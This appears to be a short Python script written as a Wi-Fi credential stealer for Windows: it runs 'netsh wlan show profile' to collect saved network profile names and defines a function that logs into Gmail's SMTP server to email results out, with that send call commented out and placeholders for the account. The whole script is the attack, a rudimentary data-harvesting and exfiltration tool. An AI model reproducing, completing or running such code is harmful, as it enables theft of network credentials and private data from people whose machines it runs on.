#!/usr/bin/env python

import subprocess, smtplib, re

def send_mail(email, password, msg):

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, msg)
    server.quit()


command = 'netsh wlan show profile'
profile_result = subprocess.check_output(command, shell=True)
network_list = re.findall('(?:Profile\s*:\s)(.*)', profile_result)
# send_mail(<EMAIL>, <PASSWORD>, result)
print (network_list)
